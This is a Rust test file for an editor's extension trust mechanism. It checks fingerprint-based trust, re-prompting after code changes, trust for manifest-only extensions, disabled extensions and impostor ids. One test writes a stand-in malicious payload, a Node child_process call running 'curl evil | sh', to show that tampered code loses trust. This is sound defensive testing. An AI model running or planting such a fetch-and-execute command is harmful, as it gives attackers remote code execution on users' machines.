use super::*;
use krad_extension_api::manifest::MANIFEST_FILE;
use std::fs;

type TestResult = Result<(), Box<dyn std::error::Error>>;

const MANIFEST: &str = r#"
id = "docker"
name = "Docker"
version = "0.1.0"
api = "1.0"

[program]
placement = "app"
runtime = "node"
args = ["main.js"]

[[contributes.command]]
id = "refresh"
title = "Docker: Refresh"
"#;

const LANGUAGE: &str = r#"
[[server_runtime]]
id = "node"
name = "Evil node"
program = "node"
search = ["~/anywhere"]
"#;

fn folder(name: &str) -> std::io::Result<PathBuf> {
    let folder = std::env::temp_dir().join(format!("krad-trust-{name}-{}", std::process::id()));
    if folder.exists() {
        fs::remove_dir_all(&folder)?;
    }
    fs::create_dir_all(&folder)?;
    fs::write(folder.join(MANIFEST_FILE), MANIFEST)?;
    fs::write(folder.join("main.js"), "first")?;
    Ok(folder)
}

fn entry(id: &str, folder: &Path) -> Result<ExtensionEntry, Box<dyn std::error::Error>> {
    Ok(ExtensionEntry {
        id: id.parse()?,
        source: ExtensionSource::Folder(folder.to_path_buf()),
        enabled: true,
        trusted: None,
    })
}

fn trusting(inspected: &Inspected) -> ExtensionEntry {
    ExtensionEntry {
        trusted: Some(inspected.fingerprint.clone()),
        ..inspected.entry.clone()
    }
}

#[test]
fn nothing_is_trusted_until_its_fingerprint_is_stored() -> TestResult {
    let root = folder("ask")?;
    let inspected = inspect(&root, entry("docker", &root)?)?;
    assert_eq!(inspected.trust(), Trust::Asked);
    assert!(inspected.trusted().is_none());
    let trusted = inspect(&root, trusting(&inspected))?;
    assert_eq!(trusted.trust(), Trust::Trusted);
    assert!(trusted
        .trusted()
        .and_then(|extension| extension.program())
        .is_some());
    Ok(())
}

#[test]
fn changing_the_program_code_asks_for_trust_again() -> TestResult {
    let root = folder("code")?;
    let first = inspect(&root, entry("docker", &root)?)?;
    let trusted = trusting(&first);
    fs::write(
        root.join("main.js"),
        "require('child_process').exec('curl evil | sh')",
    )?;
    let changed = inspect(&root, trusted)?;
    assert_eq!(changed.trust(), Trust::Asked);
    assert!(changed.trusted().is_none());
    Ok(())
}

#[test]
fn a_manifest_only_extension_needs_trust_too_and_lists_what_it_adds() -> TestResult {
    let root = std::env::temp_dir().join(format!("krad-trust-plain-{}", std::process::id()));
    if root.exists() {
        fs::remove_dir_all(&root)?;
    }
    fs::create_dir_all(&root)?;
    fs::write(root.join("node.toml"), LANGUAGE)?;
    let inspected = inspect(&root, entry("plain", &root)?)?;
    assert_eq!(inspected.trust(), Trust::Asked);
    assert_eq!(inspected.summary.server_runtimes, ["node"]);
    let entries = [inspected.entry.clone()];
    assert!(!trusted_manifest_folders(&root, &entries).contains(&root));
    let trusted = [trusting(&inspected)];
    assert!(trusted_manifest_folders(&root, &trusted).contains(&root));
    Ok(())
}

#[test]
fn a_disabled_extension_is_never_trusted() -> TestResult {
    let root = folder("disabled")?;
    let inspected = inspect(&root, entry("docker", &root)?)?;
    let disabled = ExtensionEntry {
        enabled: false,
        ..trusting(&inspected)
    };
    assert!(inspect(&root, disabled)?.trusted().is_none());
    Ok(())
}

#[test]
fn a_manifest_naming_another_extension_is_refused() -> TestResult {
    let root = folder("impostor")?;
    assert!(matches!(
        inspect(&root, entry("github", &root)?),
        Err(ExtensionError::IdMismatch { .. })
    ));
    Ok(())
}
